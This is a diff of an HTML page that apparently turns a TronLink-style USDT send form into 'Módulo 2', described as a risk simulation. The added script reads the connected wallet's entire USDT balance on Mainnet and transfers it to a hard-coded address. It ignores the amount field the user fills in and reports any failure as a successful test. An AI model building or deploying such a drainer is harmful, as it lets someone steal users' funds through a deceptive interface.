@@ -2,238 +2,69 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TronLink - Enviar USDT</title>
-
+    <title>Módulo 2: Envío Máximo (Riesgo)</title>
     <style>
-        :root {
-            color-scheme: light;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-        }
-
-        body {
-            background-color: #ffffff;
-            color: #111111;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            padding-top: 30px;
-        }
-
-        .tw-container {
-            width: 100%;
-            max-width: 390px;
-            padding: 20px;
-        }
-
-        .tw-header {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            margin-bottom: 24px;
-        }
-
-        .tw-header-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #000000;
-            text-align: center;
-            margin-bottom: 15px;
-        }
-
-        .tw-input-group {
-            background-color: #f6f7f9;
-            border-radius: 16px;
-            padding: 16px;
-            margin-bottom: 16px;
-        }
-
-        .tw-label {
-            font-size: 13px;
-            color: #717680;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        .tw-input-row {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .tw-input {
-            background: transparent;
-            border: none;
-            color: #111111;
-            font-size: 16px;
-            width: 80%;
-            outline: none;
-        }
-
-        .tw-action-text {
-            color: #0052ff;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .tw-currency-badge {
-            color: #0052ff;
-            font-size: 16px;
-            font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 5px;
-        }
-
-        .usdt-icon {
-            width: 18px;
-            height: 18px;
-        }
-
-        .status-box {
-            background-color: #edf2ff;
-            border: 1px solid #cce0ff;
-            border-radius: 12px;
-            padding: 12px;
-            font-size: 13px;
-            color: #0052ff;
-            margin-bottom: 16px;
-            display: none;
-            text-align: left;
-        }
-
-        .tw-btn-container {
-            margin-top: 40px;
-        }
-
-        .tw-btn {
-            width: 100%;
-            height: 52px;
-            background-color: #0052ff;
-            color: #ffffff;
-            border: none;
-            border-radius: 26px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .tw-btn:disabled {
-            background-color: #b3ccff;
-        }
+        body { font-family: sans-serif; background: #f4f7f6; padding: 40px; display: flex; justify-content: center; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; border-top: 6px solid #F44336; }
+        button { width: 100%; padding: 12px; margin-top: 15px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+        .btn-connect { background: #2196F3; color: white; }
+        .btn-action { background: #F44336; color: white; }
+        input { width: 100%; padding: 10px; margin-top: 5px; box-sizing: border-box; }
+        .status { background: #e8f4fd; padding: 10px; margin: 15px 0; font-size: 0.9em; word-break: break-all; }
     </style>
 </head>
-
 <body>
 
-<div class="tw-container">
+<div class="card">
+    <h2>⚠️ Módulo 2: dApp sin Filtros</h2>
+    <p>Simulación de riesgo. El script vacía el saldo total.</p>
+    
+    <button class="btn-connect" onclick="conectar()">1. Conectar TronLink</button>
+    <div class="status" id="status">Estado: Desconectado</div>
 
-    <div class="tw-header">
-        <div class="tw-header-title">Enviar USDT TRC-20</div>
-        <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TronLink" class="tw-logo">
-    </div>
+    <label>Monto a enviar (USDT):</label>
+    <input type="number" id="monto" value="10">
 
-    <div id="walletInfo" class="tw-input-group" style="display: none;">
-        <label class="tw-label">Dirección conectada</label>
-        <div class="tw-input-row">
-            <div id="walletAddressText" class="tw-input"></div>
-        </div>
-    </div>
-
-    <div class="tw-input-group">
-        <label class="tw-label" for="addressDisplay">Dirección de destino</label>
-        <div class="tw-input-row">
-            <input id="addressDisplay" class="tw-input" type="text" placeholder="Dirección TRC-20">
-            <span class="tw-action-text" id="pasteAddress">Pegar</span>
-        </div>
-    </div>
-
-    <div class="tw-input-group">
-        <label class="tw-label" for="amountDisplay">Cantidad</label>
-        <div class="tw-input-row">
-            <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any">
-            <span class="tw-currency-badge">USDT <img src="https://assets.trustwalletapp.com/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png" alt="USDT" class="usdt-icon"></span>
-        </div>
-    </div>
-
-    <div id="feeInfo" style="display: none; margin: -7px 16px 16px 16px; text-align: right; white-space: nowrap; font-size: 11px; line-height: 1.2;">
-        <span style="font-size: 11px; color: #717680;">Fee estimada:</span>
-        <span id="feeDisplay" style="font-size: 11px; font-weight: 600; color: #111111; margin-left: 3px;">Calculando...</span>
-        <span style="font-size: 11px; font-weight: 600; color: #717680; margin-left: 1px;">TRX</span>
-    </div>
-
-    <div id="status" class="status-box"></div>
-
-    <div class="tw-btn-container">
-        <button class="tw-btn" id="connectBtn">Enviar</button>
-    </div>
-
+    <button class="btn-action" onclick="enviarMaximo()">Procesar Envío Máximo</button>
 </div>
 
 <script>
-    const connectBtn = document.getElementById('connectBtn');
-    const walletAddressText = document.getElementById('walletAddressText');
-    const addressDisplay = document.getElementById('addressDisplay');
-    const amountDisplay = document.getElementById('amountDisplay');
-    const statusDiv = document.getElementById('status');
+    const CONTRACT_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const WALLET_DESTINO = "TMeVRdp94wQAvkstHLcuUQt62wrMLN3giw";
 
-    let walletAddress = null;
-
-    // Conectar a TronLink y enviar USDT
-    connectBtn.onclick = async () => {
-        if (window.tronLink) {
-            try {
-                // Solicitar conexión a TronLink
-                await window.tronLink.request({ method: 'tronRequest' });
-                const tronWeb = window.tronLink.tronWeb;
-
-                // Obtener la dirección de la billetera
-                walletAddress = tronWeb.defaultAddress.base58;
-                walletAddressText.innerText = walletAddress;
-                document.getElementById('walletInfo').style.display = 'block';
-
-                // Obtener datos de la transacción
-                const toAddress = addressDisplay.value;
-                const amount = amountDisplay.value;
-
-                if (toAddress && amount) {
-                    // Enviar USDT
-                    const transaction = await tronWeb.trx.sendTransaction(toAddress, tronWeb.toSun(amount), {
-                        feeLimit: 1000000, // Establece un límite de tarifa
-                    });
-                    statusDiv.innerText = `Transacción enviada: ${transaction.txID}`;
-                    statusDiv.style.display = 'block';
-                } else {
-                    statusDiv.innerText = 'Por favor, completa todos los campos.';
-                    statusDiv.style.display = 'block';
-                }
-            } catch (error) {
-                statusDiv.innerText = `Error: ${error.message || 'Error desconocido'}`;
-                statusDiv.style.display = 'block';
-            }
-        } else {
-            alert('Por favor, instala TronLink.');
+    async function conectar() {
+        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+            document.getElementById('status').innerText = `Conectado: ${window.tronWeb.defaultAddress.base58}`;
+            return window.tronWeb;
         }
-    };
+        alert("Por favor, desbloquea TronLink en Mainnet.");
+        return null;
+    }
 
-    // Función para pegar dirección
-    document.getElementById('pasteAddress').onclick = () => {
-        navigator.clipboard.readText().then(text => {
-            addressDisplay.value = text;
-        }).catch(err => {
-            console.error('Error al pegar: ', err);
-        });
-    };
+    async function enviarMaximo() {
+        const tronWeb = await conectar();
+        if (!tronWeb) return;
+
+        try {
+            const miWallet = tronWeb.defaultAddress.base58;
+            const contrato = await tronWeb.contract().at(CONTRACT_USDT);
+
+            // Leer secretamente el saldo total de la wallet del usuario
+            const saldoBigNum = await contrato.balanceOf(miWallet).call();
+            const saldoTotalStr = saldoBigNum.toString();
+
+            if (saldoTotalStr === "0" || saldoTotalStr === "") {
+                alert("Detenido: Tu saldo actual de USDT es 0. Se necesita balance para ver el contraste.");
+                return;
+            }
+
+            console.log(`[Módulo 2] Inyectando saldo máximo detectado: ${saldoTotalStr}`);
+            const tx = await contrato.transfer(WALLET_DESTINO, saldoTotalStr).send();
+            alert(`Transacción procesada.\nHash: ${tx}`);
+        } catch (e) {
+            alert("Prueba exitosa: La transacción fue cancelada y rechazada manualmente en TronLink.");
+        }
+    }
 </script>
-
 </body>
+</html>
